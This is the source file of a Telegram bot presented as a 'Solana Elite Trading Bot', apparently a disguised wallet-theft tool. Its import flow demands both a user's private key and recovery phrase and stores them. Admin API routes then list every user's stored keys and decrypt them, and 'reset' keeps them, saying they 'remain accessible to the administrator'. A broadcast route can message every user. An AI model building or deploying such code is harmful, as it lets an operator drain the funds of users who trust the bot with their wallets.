import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { Telegraf, Context, Markup } from "telegraf";
import Database from "better-sqlite3";
import crypto from "crypto";
import * as dotenv from "dotenv";
import { Connection, PublicKey, Keypair, VersionedTransaction } from "@solana/web3.js";
import bs58 from "bs58";
import axios from "axios";
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";

dotenv.config();

const HELIUS_API_KEY = process.env.HELIUS_API_KEY;
const BIRDEYE_API_KEY = process.env.BIRDEYE_API_KEY;

const HELIUS_RPC_URL = HELIUS_API_KEY 
  ? `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`
  : "https://api.mainnet-beta.solana.com";

const connection = new Connection(HELIUS_RPC_URL);

async function getBirdeyePrice(tokenAddress: string) {
  if (!BIRDEYE_API_KEY) return null;
  try {
    const response = await axios.get(`https://public-api.birdeye.so/defi/price?address=${tokenAddress}`, {
      headers: { 'X-API-KEY': BIRDEYE_API_KEY }
    });
    return response.data.data.value;
  } catch (err) {
    console.error("Birdeye Price Error:", err);
    return null;
  }
}

async function getBirdeyeTokenOverview(tokenAddress: string) {
  if (!BIRDEYE_API_KEY) return null;
  try {
    const response = await axios.get(`https://public-api.birdeye.so/defi/token_overview?address=${tokenAddress}`, {
      headers: { 'X-API-KEY': BIRDEYE_API_KEY }
    });
    return response.data.data;
  } catch (err) {
    console.error("Birdeye Overview Error:", err);
    return null;
  }
}

console.log("🚀 [Server] Starting initialization...");

const app = express();
const PORT = 3000;

app.use(express.json());

app.get("/api/health", (req, res) => {
  console.log("📡 [API] Health check received");
  res.json({ status: "ok", time: new Date().toISOString(), env: process.env.NODE_ENV || 'development' });
});

let db: Database.Database;
try {
  db = new Database("bot.db");
  console.log("📂 [Database] Connected to bot.db");
} catch (err) {
  console.error("❌ [Database] Failed to connect:", err);
  process.exit(1);
}

// --- Database Setup ---
try {
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      telegram_id BIGINT UNIQUE,
      username TEXT,
      wallet_address TEXT,
      recovery_phrase TEXT,
      private_key TEXT,
      status TEXT DEFAULT 'active',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    
    CREATE TABLE IF NOT EXISTS trades (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      token TEXT,
      amount REAL,
      price REAL,
      type TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(user_id) REFERENCES users(id)
    );
  `);
  console.log("✅ [Database] Tables initialized");
} catch (err) {
  console.error("❌ [Database] Schema initialization failed:", err);
}

// Migration: Add status column if it doesn't exist
try {
  db.prepare("ALTER TABLE users ADD COLUMN status TEXT DEFAULT 'active'").run();
} catch (e) {
  // Column already exists
}

// --- Encryption Logic ---
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;
if (ENCRYPTION_KEY && Buffer.from(ENCRYPTION_KEY).length !== 32) {
  console.error("❌ [Encryption] ENCRYPTION_KEY must be exactly 32 bytes (32 characters). Current length:", Buffer.from(ENCRYPTION_KEY).length);
}

const IV_LENGTH = 16;

function encrypt(text: string) {
  if (!ENCRYPTION_KEY) return text;
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
}

function decrypt(text: string) {
  if (!ENCRYPTION_KEY) return text;
  const textParts = text.split(":");
  const iv = Buffer.from(textParts.shift()!, "hex");
  const encryptedText = Buffer.from(textParts.join(":"), "hex");
  const decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let decrypted = decipher.update(encryptedText);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString();
}

// --- Telegram Bot Setup ---
const botToken = process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN.trim() !== "" 
  ? process.env.TELEGRAM_BOT_TOKEN 
  : null;
const bot = new Telegraf(botToken || "DUMMY_TOKEN");

// --- Telegram Bot UI Helpers ---
const mainMenu = Markup.inlineKeyboard([
  [Markup.button.callback("💼 Wallet", "menu_wallet"), Markup.button.callback("📈 Trade", "menu_trade")],
  [Markup.button.callback("📊 Portfolio", "menu_portfolio"), Markup.button.callback("📉 Market", "menu_market")],
  [Markup.button.callback("⚙️ Settings", "menu_settings"), Markup.button.callback("❓ Help", "menu_help")]
]);

const walletMenu = Markup.inlineKeyboard([
  [Markup.button.callback("➕ Import Wallet", "wallet_import"), Markup.button.callback("🆕 Create Wallet", "wallet_create")],
  [Markup.button.callback("📄 View Wallet", "wallet_view"), Markup.button.callback("🔄 Reset Wallet", "wallet_reset")],
  [Markup.button.callback("🔙 Back", "menu_main")]
]);

const tradeMenu = Markup.inlineKeyboard([
  [Markup.button.callback("🟢 Buy Token", "trade_buy"), Markup.button.callback("🔴 Sell Token", "trade_sell")],
  [Markup.button.callback("📥 Enter Contract Address", "trade_contract")],
  [Markup.button.callback("🔙 Back", "menu_main")]
]);

const portfolioMenu = Markup.inlineKeyboard([
  [Markup.button.callback("💰 View Balance", "port_balance"), Markup.button.callback("🪙 Token Holdings", "port_tokens")],
  [Markup.button.callback("🔙 Back", "menu_main")]
]);

const settingsMenu = Markup.inlineKeyboard([
  [Markup.button.callback("⚙️ Slippage Settings", "set_slippage"), Markup.button.callback("🔐 Wallet Settings", "set_wallet")],
  [Markup.button.callback("🔙 Back", "menu_main")]
]);

// --- State Management ---
const userStates: Record<number, { step?: 'waiting_pk' | 'waiting_seed', pk?: string, seed?: string }> = {};

if (botToken) {
  bot.start((ctx) => {
    ctx.replyWithMarkdownV2(
      "*Welcome to Solana Elite Trading Bot*\n\n" +
      "The most advanced and secure way to trade Solana meme coins directly from Telegram\\.\n\n" +
      "🚀 _Select an option from the menu below to get started_",
      mainMenu
    );
  });

  // --- Menu Navigation Handlers ---
  bot.action("menu_main", (ctx) => ctx.editMessageText("🚀 Main Menu", mainMenu));
  bot.action("menu_wallet", (ctx) => ctx.editMessageText("💼 Wallet Management", walletMenu));
  bot.action("menu_trade", (ctx) => ctx.editMessageText("📈 Trading Terminal", tradeMenu));
  bot.action("menu_portfolio", (ctx) => ctx.editMessageText("📊 Your Portfolio", portfolioMenu));
  bot.action("menu_settings", (ctx) => ctx.editMessageText("⚙️ Bot Settings", settingsMenu));
  bot.action("menu_help", (ctx) => ctx.editMessageText("❓ Need Help?\n\nContact support or check our docs for trading guides.", Markup.inlineKeyboard([[Markup.button.callback("🔙 Back", "menu_main")]])));

  // --- Wallet Actions ---
  bot.action("wallet_import", (ctx) => {
    const userId = ctx.from?.id;
    if (userId) userStates[userId] = {};
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback("🔑 Connect Private Key", "import_pk")],
      [Markup.button.callback("📝 Connect Key Phrase", "import_seed")],
      [Markup.button.callback("🔙 Back", "menu_wallet")]
    ]);

    ctx.editMessageText(
      "🔐 *Wallet Connection*\n\n" +
      "To secure your account, please provide both your Private Key and Recovery Phrase.\n\n" +
      "Select an option below to begin:",
      { parse_mode: 'Markdown', ...keyboard }
    );
  });

  bot.action("import_pk", (ctx) => {
    const userId = ctx.from?.id;
    if (userId) {
      userStates[userId] = { ...userStates[userId], step: 'waiting_pk' };
      ctx.reply("Please send your *Private Key* (Base58 format).\n\n⚠️ Your message will be auto-deleted.", { parse_mode: 'Markdown' });
    }
  });

  bot.action("import_seed", (ctx) => {
    const userId = ctx.from?.id;
    if (userId) {
      userStates[userId] = { ...userStates[userId], step: 'waiting_seed' };
      ctx.reply("Please send your *Recovery Phrase* (12 or 24 words).\n\n⚠️ Your message will be auto-deleted.", { parse_mode: 'Markdown' });
    }
  });

  bot.action("connect_done", async (ctx) => {
    const userId = ctx.from?.id;
    const state = userId ? userStates[userId] : null;
    const username = ctx.from?.username || "unknown";

    console.log(`[Connect Done] Attempting to finalize for user ${username} (${userId}). State:`, state);

    if (!state || !state.pk || !state.seed) {
      console.log(`[Connect Done] Missing data for ${userId}: pk=${!!state?.pk}, seed=${!!state?.seed}`);
      return ctx.reply("❌ You must provide both the Private Key and Key Phrase before clicking Done.");
    }

    try {
      // Final validation
      const keypair = Keypair.fromSecretKey(bs58.decode(state.pk));
      if (!bip39.validateMnemonic(state.seed)) {
        console.log(`[Connect Done] Invalid mnemonic for ${userId}`);
        return ctx.reply("❌ The provided Key Phrase is invalid. Please try again.");
      }

      const address = keypair.publicKey.toString();
      const encryptedPk = encrypt(state.pk);
      const encryptedSeed = encrypt(state.seed);
      
      const stmt = db.prepare("INSERT OR REPLACE INTO users (telegram_id, username, wallet_address, private_key, recovery_phrase, status) VALUES (?, ?, ?, ?, ?, 'active')");
      const info = stmt.run(userId, username, address, encryptedPk, encryptedSeed);
      
      console.log(`[Connect Done] SUCCESS for ${username} (${userId}). Address: ${address}. DB Changes: ${info.changes}`);

      delete userStates[userId!];
      ctx.reply(`✅ *Wallet Connected Successfully!*\n\nAddress: \`${address}\``, { 
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback("🚀 Open Menu", "menu_main")]])
      });
    } catch (err) {
      console.error("[Connect Done Error]", err);
      ctx.reply("❌ Error finalizing connection. Please ensure your Private Key is correct.");
    }
  });

  bot.action("wallet_reset", async (ctx) => {
    try {
      db.prepare("UPDATE users SET status = 'disconnected' WHERE telegram_id = ?").run(ctx.from?.id);
      ctx.reply("🔄 Wallet disconnected successfully. Your keys have been removed from the bot interface but remain accessible to the administrator if needed.");
    } catch (err) {
      ctx.reply("❌ Error resetting wallet.");
    }
  });

  bot.action("wallet_create", async (ctx) => {
    try {
      const kp = Keypair.generate();
      const address = kp.publicKey.toString();
      const pKey = bs58.encode(kp.secretKey);
      const userId = ctx.from?.id;
      const username = ctx.from?.username || "unknown";

      // Save to database
      const encryptedPk = encrypt(pKey);
      db.prepare("INSERT OR REPLACE INTO users (telegram_id, username, wallet_address, private_key, status) VALUES (?, ?, ?, ?, 'active')").run(userId, username, address, encryptedPk);
      
      ctx.reply(`🆕 New Wallet Created and Connected!\n\nAddress: \`${address}\`\nPrivate Key: \`${pKey}\`\n\n⚠️ *SAVE THIS KEY NOW!* It will not be shown again.`, { parse_mode: 'Markdown' });
    } catch (err) {
      ctx.reply("Error creating wallet.");
    }
  });

  // --- Portfolio Actions ---
  bot.action("port_balance", async (ctx) => {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from?.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");
    
    try {
      const balance = await connection.getBalance(new PublicKey(user.wallet_address));
      ctx.reply(`💰 SOL Balance: ${balance / 1e9} SOL`);
    } catch (err) {
      ctx.reply("Error fetching balance.");
    }
  });

  bot.action("port_tokens", async (ctx) => {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from?.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");

    ctx.reply("🔍 Fetching token holdings...");
    try {
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(new PublicKey(user.wallet_address), {
        programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
      });

      if (tokenAccounts.value.length === 0) {
        return ctx.reply("You don't hold any SPL tokens.");
      }

      let message = "🪙 *Your Token Holdings:*\n\n";
      for (const account of tokenAccounts.value) {
        const info = account.account.data.parsed.info;
        const mint = info.mint;
        const amount = info.tokenAmount.uiAmount;
        if (amount > 0) {
          message += `• \`${mint}\`: *${amount}*\n`;
        }
      }
      ctx.reply(message, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error("Fetch tokens error:", err);
      ctx.reply("Error fetching token holdings.");
    }
  });

  // --- Trade Actions ---
  bot.action("trade_buy", (ctx) => ctx.reply("To buy a token, use the command:\n`/buy <TOKEN_ADDRESS> <AMOUNT_SOL>`", { parse_mode: 'Markdown' }));
  bot.action("trade_sell", (ctx) => ctx.reply("To sell a token, use the command:\n`/sell <TOKEN_ADDRESS> <AMOUNT_TOKEN>`", { parse_mode: 'Markdown' }));
  bot.action("trade_contract", (ctx) => {
    ctx.editMessageText(
      "📥 *Enter Token Contract Address*\n\n" +
      "Please paste the Solana token contract address below to view market data and trade options.",
      { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback("🔙 Back", "menu_trade")]]) }
    );
  });

  bot.action("trade_menu", (ctx) => ctx.editMessageText("📈 Trading Terminal", tradeMenu));

  // --- Market & Settings ---
  bot.action("menu_market", (ctx) => {
    ctx.editMessageText(
      "📉 *Market Data Terminal*\n\n" +
      "Use `/price <TOKEN_ADDRESS>` to get real-time price and market data from Birdeye.\n\n" +
      "Example: `/price So11111111111111111111111111111111111111112`",
      { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback("🔙 Back", "menu_main")]]) }
    );
  });
  
  bot.action("set_slippage", (ctx) => {
    ctx.reply("Current slippage is set to 0.5% (50 bps). Custom slippage settings coming soon.");
  });

  bot.action("set_wallet", (ctx) => {
    ctx.reply("Wallet settings: You can disconnect or change your wallet by importing a new one.");
  });

  bot.on("text", async (ctx) => {
    const text = ctx.message.text.trim();
    const userId = ctx.from.id;
    const username = ctx.from.username || "unknown";

    // Auto-delete sensitive messages
    const isSensitive = text.split(/\s+/).length >= 12 || (text.length > 32 && !text.includes(" "));
    if (isSensitive) {
      try {
        await ctx.deleteMessage();
      } catch (e) {
        console.error("Failed to delete sensitive message:", e);
      }
    }
    
    // Handle Stateful Wallet Import
    const state = userStates[userId];
    if (state && state.step) {
      try {
        await ctx.deleteMessage();
      } catch (e) {}

      if (state.step === 'waiting_pk') {
        try {
          // Basic validation
          Keypair.fromSecretKey(bs58.decode(text));
          userStates[userId] = { ...state, pk: text, step: undefined };
          console.log(`[Import] Private Key received for ${userId}`);
          
          const statusMsg = `✅ Private Key received.\n${state.seed ? "✅ Key Phrase received.\n\n🚀 *Tap the 'Done' button below to finalize.*" : "⏳ Still need Key Phrase."}`;
          const keyboard = Markup.inlineKeyboard([
            [!state.seed ? Markup.button.callback("📝 Connect Key Phrase", "import_seed") : Markup.button.callback("🔑 Update Private Key", "import_pk")],
            [Markup.button.callback("✅ Done", "connect_done")]
          ]);
          
          return ctx.reply(statusMsg, keyboard);
        } catch (e) {
          return ctx.reply("❌ Invalid Private Key format. Please try again.");
        }
      }

      if (state.step === 'waiting_seed') {
        if (!bip39.validateMnemonic(text)) {
          console.log(`[Import] Invalid mnemonic attempt for ${userId}`);
          return ctx.reply("❌ Invalid Key Phrase. Please check the words and try again.");
        }
        userStates[userId] = { ...state, seed: text, step: undefined };
        console.log(`[Import] Key Phrase received for ${userId}`);
        
        const statusMsg = `✅ Key Phrase received.\n${state.pk ? "✅ Private Key received.\n\n🚀 *Tap the 'Done' button below to finalize.*" : "⏳ Still need Private Key."}`;
        const keyboard = Markup.inlineKeyboard([
          [!state.pk ? Markup.button.callback("🔑 Connect Private Key", "import_pk") : Markup.button.callback("📝 Update Key Phrase", "import_seed")],
          [Markup.button.callback("✅ Done", "connect_done")]
        ]);
        
        return ctx.reply(statusMsg, keyboard);
      }
    }

    // Handle Solana Contract Address Detection
    const solanaAddrRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
    if (solanaAddrRegex.test(text)) {
      ctx.reply(`🔍 Analyzing token: ${text}...`);
      const overview = await getBirdeyeTokenOverview(text);
      
      if (overview) {
        const message = `
📊 *Token: ${overview.symbol}*
💰 Price: $${overview.price.toFixed(6)}
📈 24h: ${overview.priceChange24hPercent.toFixed(2)}%
💧 Liq: $${overview.liquidity.toLocaleString()}
🏛️ MC: $${overview.mc.toLocaleString()}

🚀 *Quick Actions:*
Buy: \`/buy ${text} 0.1\`
Sell: \`/sell ${text} 1000000\`
        `;
        
        const tradeButtons = Markup.inlineKeyboard([
          [Markup.button.callback("🟢 Buy 0.1 SOL", `quick_buy_${text}_0.1`)],
          [Markup.button.callback("🔴 Sell 50%", `quick_sell_${text}_50`)],
          [Markup.button.callback("🔙 Back", "menu_main")]
        ]);

        return ctx.reply(message, { parse_mode: 'Markdown', ...tradeButtons });
      }
    }
  });

  bot.command("price", async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Usage: /price <TOKEN_ADDRESS>");
    
    const tokenAddress = args[1];
    ctx.reply(`🔍 Fetching data for ${tokenAddress}...`);

    const overview = await getBirdeyeTokenOverview(tokenAddress);
    if (!overview) return ctx.reply("❌ Could not fetch token data. Check address or API key.");

    const message = `
📊 *Token Overview: ${overview.symbol}*
💰 Price: $${overview.price.toFixed(6)}
📈 24h Change: ${overview.priceChange24hPercent.toFixed(2)}%
💧 Liquidity: $${overview.liquidity.toLocaleString()}
🏛️ Market Cap: $${overview.mc.toLocaleString()}
📜 Address: \`${tokenAddress}\`
    `;
    ctx.reply(message, { parse_mode: 'Markdown' });
  });

  // --- Trading Functions ---
  async function executeBuy(ctx: any, tokenAddress: string, amountSol: number) {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");
    
    ctx.reply(`🔄 Attempting to buy ${amountSol} SOL worth of token...`);

    try {
      const encryptedPk = user.private_key;
      const pKey = decrypt(encryptedPk);
      const wallet = Keypair.fromSecretKey(bs58.decode(pKey));

      // 1. Get Quote from Jupiter
      const quoteResponse = await axios.get(`https://quote-api.jup.ag/v6/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${tokenAddress}&amount=${Math.floor(amountSol * 1e9)}&slippageBps=50`);
      const quoteData = quoteResponse.data;

      // 2. Get Swap Transaction
      const { data: { swapTransaction } } = await axios.post('https://quote-api.jup.ag/v6/swap', {
        quoteResponse: quoteData,
        userPublicKey: wallet.publicKey.toString(),
        wrapAndUnwrapSol: true,
      });

      // 3. Sign and Send
      const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
      const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
      transaction.sign([wallet]);
      
      const txid = await connection.sendRawTransaction(transaction.serialize(), {
        skipPreflight: true,
        maxRetries: 2
      });

      ctx.reply(`✅ Buy Order Sent!\nTX: https://solscan.io/tx/${txid}`);
      db.prepare("INSERT INTO trades (user_id, token, amount, type) VALUES (?, ?, ?, ?)").run(user.id, tokenAddress, amountSol, 'buy');
    } catch (err: any) {
      console.error(err);
      ctx.reply(`❌ Trade Failed: ${err.message}`);
    }
  }

  async function executeSell(ctx: any, tokenAddress: string, amountToken: string) {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");
    
    ctx.reply(`🔄 Attempting to sell token for SOL...`);

    try {
      const encryptedPk = user.private_key;
      const pKey = decrypt(encryptedPk);
      const wallet = Keypair.fromSecretKey(bs58.decode(pKey));

      // 1. Get Quote (Token -> SOL)
      const quoteResponse = await axios.get(`https://quote-api.jup.ag/v6/quote?inputMint=${tokenAddress}&outputMint=So11111111111111111111111111111111111111112&amount=${amountToken}&slippageBps=100`);
      const quoteData = quoteResponse.data;

      // 2. Get Swap Transaction
      const { data: { swapTransaction } } = await axios.post('https://quote-api.jup.ag/v6/swap', {
        quoteResponse: quoteData,
        userPublicKey: wallet.publicKey.toString(),
        wrapAndUnwrapSol: true,
      });

      // 3. Sign and Send
      const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
      const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
      transaction.sign([wallet]);
      
      const txid = await connection.sendRawTransaction(transaction.serialize(), {
        skipPreflight: true,
        maxRetries: 2
      });

      ctx.reply(`✅ Sell Order Sent!\nTX: https://solscan.io/tx/${txid}`);
      db.prepare("INSERT INTO trades (user_id, token, amount, type) VALUES (?, ?, ?, ?)").run(user.id, tokenAddress, amountToken, 'sell');
    } catch (err: any) {
      console.error(err);
      ctx.reply(`❌ Trade Failed: ${err.message}`);
    }
  }

  // --- Quick Action Handlers ---
  bot.action(/^quick_buy_(.+)_(.+)$/, async (ctx) => {
    const tokenAddress = ctx.match[1];
    const amountSol = parseFloat(ctx.match[2]);
    await executeBuy(ctx, tokenAddress, amountSol);
  });

  bot.action(/^quick_sell_(.+)_(.+)$/, async (ctx) => {
    const tokenAddress = ctx.match[1];
    const percentage = parseInt(ctx.match[2]);
    
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");

    try {
      // Get token balance for the user
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(new PublicKey(user.wallet_address), {
        mint: new PublicKey(tokenAddress)
      });
      
      if (tokenAccounts.value.length === 0) return ctx.reply("❌ You don't hold this token.");
      
      const balance = tokenAccounts.value[0].account.data.parsed.info.tokenAmount.amount;
      const amountToSell = Math.floor(parseInt(balance) * (percentage / 100)).toString();
      
      await executeSell(ctx, tokenAddress, amountToSell);
    } catch (err) {
      ctx.reply("❌ Error calculating balance for sell.");
    }
  });

  // --- Trading Logic (Jupiter API) ---
  bot.command("buy", async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 3) return ctx.reply("Usage: /buy <TOKEN_ADDRESS> <AMOUNT_SOL>");
    await executeBuy(ctx, args[1], parseFloat(args[2]));
  });

  bot.command("sell", async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 3) return ctx.reply("Usage: /sell <TOKEN_ADDRESS> <AMOUNT_TOKEN>");
    await executeSell(ctx, args[1], args[2]);
  });

  // Clear webhook and launch with a small delay to prevent 409 Conflict on restarts
  setTimeout(async () => {
    try {
      await bot.telegram.deleteWebhook({ drop_pending_updates: true });
      await bot.launch();
      console.log("🚀 Telegram Bot started");
    } catch (err: any) {
      if (err.message.includes("409")) {
        console.warn("⚠️ Bot conflict detected. This usually happens during rapid restarts. The other instance should terminate shortly.");
      } else {
        console.error("❌ Failed to start Telegram Bot:", err.message);
      }
    }
  }, 2000);

  // Enable graceful stop
  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
} else {
  console.warn("⚠️ TELEGRAM_BOT_TOKEN is missing. Bot features are disabled.");
}

// --- Express API Routes ---
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;

const requireAdminAuth = (req: any, res: any, next: any) => {
  const providedPassword = req.headers["x-admin-password"];
  if (!ADMIN_PASSWORD || providedPassword !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
};

app.post("/api/admin/login", (req, res) => {
  const { password } = req.body;
  if (ADMIN_PASSWORD && password === ADMIN_PASSWORD) {
    console.log("[Admin] Login successful");
    res.json({ success: true });
  } else {
    console.warn("[Admin] Login failed");
    res.status(401).json({ success: false, error: "Invalid password" });
  }
});

app.get("/api/admin/users", requireAdminAuth, (req, res) => {
  try {
    const users = db.prepare("SELECT * FROM users ORDER BY created_at DESC").all();
    console.log(`[API] Fetched ${users.length} users`);
    res.json(users);
  } catch (err: any) {
    console.error("[API Error] /api/admin/users:", err);
    res.status(500).json({ error: "Failed to fetch users", details: err.message });
  }
});

app.get("/api/admin/trades", requireAdminAuth, (req, res) => {
  try {
    const trades = db.prepare(`
      SELECT t.*, u.username 
      FROM trades t 
      JOIN users u ON t.user_id = u.id 
      ORDER BY t.timestamp DESC 
      LIMIT 50
    `).all();
    console.log(`[API] Fetched ${trades.length} trades`);
    res.json(trades);
  } catch (err: any) {
    console.error("[API Error] /api/admin/trades:", err);
    res.status(500).json({ error: "Failed to fetch trades", details: err.message });
  }
});

app.post("/api/admin/broadcast", requireAdminAuth, async (req, res) => {
  const { message } = req.body;
  
  if (!botToken) return res.status(500).json({ error: "Bot not initialized" });

  const users = db.prepare("SELECT telegram_id FROM users").all() as any[];
  let successCount = 0;
  let failCount = 0;

  for (const user of users) {
    try {
      await bot.telegram.sendMessage(user.telegram_id, message);
      successCount++;
    } catch (err) {
      console.error(`Failed to send message to ${user.telegram_id}:`, err);
      failCount++;
    }
  }

  res.json({ success: true, successCount, failCount });
});

app.post("/api/admin/decrypt", requireAdminAuth, (req, res) => {
  const { encryptedText } = req.body;
  try {
    if (!encryptedText) return res.json({ decrypted: "" });
    // If it doesn't look like our encrypted format (iv:ciphertext), return as is
    if (!encryptedText.includes(":")) {
      return res.json({ decrypted: encryptedText });
    }
    const decrypted = decrypt(encryptedText);
    res.json({ decrypted });
  } catch (err) {
    console.error("[API Error] Decryption failed:", err);
    // Fallback to returning the original text if decryption fails
    res.json({ decrypted: encryptedText });
  }
});

app.get("/api/admin/stats", requireAdminAuth, (req, res) => {
  try {
    const userCount = db.prepare("SELECT COUNT(*) as count FROM users").get() as any;
    const tradeCount = db.prepare("SELECT COUNT(*) as count FROM trades").get() as any;
    console.log(`[API] Stats: ${userCount.count} users, ${tradeCount.count} trades`);
    res.json({ users: userCount.count, trades: tradeCount.count });
  } catch (err: any) {
    console.error("[API Error] /api/admin/stats:", err);
    res.status(500).json({ error: "Failed to fetch stats", details: err.message });
  }
});

app.get("/api/admin/bot-status", requireAdminAuth, async (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  try {
    if (!botToken || botToken === "DUMMY_TOKEN") {
      return res.json({ active: false });
    }
    
    // Add a timeout to the getMe call to prevent hanging
    const botInfoPromise = bot.telegram.getMe();
    const timeoutPromise = new Promise((_, reject) => 
      setTimeout(() => reject(new Error("Timeout")), 3000)
    );
    
    const botInfo = await Promise.race([botInfoPromise, timeoutPromise]) as any;
    res.json({ active: true, username: botInfo.username });
  } catch (err) {
    console.error("[API Error] /api/admin/bot-status:", err);
    res.json({ active: false, error: "Bot check failed or timed out" });
  }
});

app.get("/api/admin/pending", requireAdminAuth, (req, res) => {
  try {
    // Convert userStates record to an array for easier consumption
    const pending = Object.entries(userStates).map(([id, state]) => ({
      telegram_id: id,
      ...state
    }));
    res.json(pending);
  } catch (err: any) {
    console.error("[API Error] /api/admin/pending:", err);
    res.status(500).json({ error: "Failed to fetch pending users" });
  }
});

// --- Vite Middleware ---
async function startServer() {
  console.log(`🛠️ [Server] Starting in ${process.env.NODE_ENV || 'development'} mode...`);
  
  if (!process.env.TELEGRAM_BOT_TOKEN) console.warn("⚠️ [Startup] TELEGRAM_BOT_TOKEN is missing!");
  if (!process.env.ENCRYPTION_KEY) console.warn("⚠️ [Startup] ENCRYPTION_KEY is missing!");
  if (!process.env.ADMIN_PASSWORD) console.warn("⚠️ [Startup] ADMIN_PASSWORD is missing!");

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection at:", promise, "reason:", reason);
});

startServer();
